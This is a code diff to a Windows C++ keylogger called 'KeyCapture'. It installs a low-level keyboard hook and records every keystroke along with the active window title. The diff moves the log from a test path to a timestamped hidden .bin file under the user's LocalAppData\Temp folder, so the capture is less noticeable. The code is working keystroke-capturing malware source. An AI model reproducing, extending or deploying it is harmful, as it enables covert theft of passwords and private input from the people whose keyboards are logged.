@@ -3,11 +3,14 @@
 
 #include "stdafx.h"
 #include <Windows.h>
+#include <Shlobj.h>
+
 #include "time.h"
 #include "string" 
 #include <sstream>
 #include <fstream>
 #include <iostream>
+#include <chrono>
 
 // KeyBoard hook handle in global scope
 HHOOK KeyboardHook;
@@ -18,7 +21,9 @@ char cWindow[1000];
 // NULL is ok
 HWND lastWindow = NULL;
 // File Path
-std::string fileName = "C:\\test.txt";
+std::wstring fileName = L"C:\\test.txt";
+
+
 
 // All hooks must be unhooked!
 void unhookKeyboard()
@@ -210,16 +215,7 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 		_In_ int nVirtKeydasdsad
 		);
 	*/
-	std::ofstream myfile(fileName, std::ios::out | std::ios::app);
-	bool caps = FALSE;
-	SHORT capsShort = GetKeyState(VK_CAPITAL);
-	std::string outPut;
-	std::stringstream temp;
-	if (capsShort > 0)
-	{
-		// If the high-order bit is 1, the key is down; otherwise, it is up
-		caps = TRUE;
-	}
+
 	/* 
 	WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
 	LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
@@ -238,6 +234,16 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	// Do the wParam and lParam parameters contain information about a keyboard message.
 	if (nCode == HC_ACTION)
 	{
+		std::ofstream myfile(fileName, std::ios::out | std::ios::app | std::ios::binary);
+		bool caps = FALSE;		SHORT capsShort = GetKeyState(VK_CAPITAL);
+		std::string outPut;
+		std::stringstream temp;
+		if (capsShort > 0)
+		{
+			// If the high-order b2it is 1, the key is down; otherwise, it is up
+			caps = TRUE;
+		}
+
 		// Messsage data is ready for pickup
 		// Check for SHIFT key
 		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
@@ -306,9 +312,11 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				temp << " - Current Window: " << cWindow << "\n\n";
 				//outPut.append(temp.str());
 				std::cout << temp.str() << std::endl;
+				myfile << temp.str() << std::endl;
 				// Setup for next CallBack
 				lastWindow = currentWindow;
 			}
+
 			// Now capture keys
 			if (p->vkCode)
 			{
@@ -316,18 +324,45 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				temp.clear();
 				temp << HookCode(p->vkCode, caps, shift);
 				std::cout << temp.str();
+				myfile << temp.str() << std::endl;
 			}
 			// Final output logic
 		}
+
+		myfile.close();
+
 	}
 	// hook procedure must pass the message *Always*
-	myfile.close();
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 
 int main()
 {
+	PWSTR pwstrAppData = NULL;
+
+	HRESULT hr = SHGetKnownFolderPath(
+		FOLDERID_LocalAppData/*FOLDERID_AppDataProgramData*/,
+		0,
+		NULL,
+		&pwstrAppData
+	);
+
+	if (hr != S_OK)
+	{
+		std::cout << "SHGetKnownFolderPath failed with " << "0x" << std::hex << hr;
+		return hr;
+	}
+
+
+	long long timestamp = std::chrono::system_clock::now().time_since_epoch().count() / 1000000;
+	fileName = std::wstring(pwstrAppData) + L"\\Temp\\kl" + std::to_wstring(timestamp) + L".bin";
+
+	if (pwstrAppData) {
+		CoTaskMemFree(pwstrAppData);
+		pwstrAppData = NULL;
+	}
+
 	std::cout << "[*] Starting KeyCapture" << std::endl;
 	/*
 	HHOOK WINAPI SetWindowsHookEx(
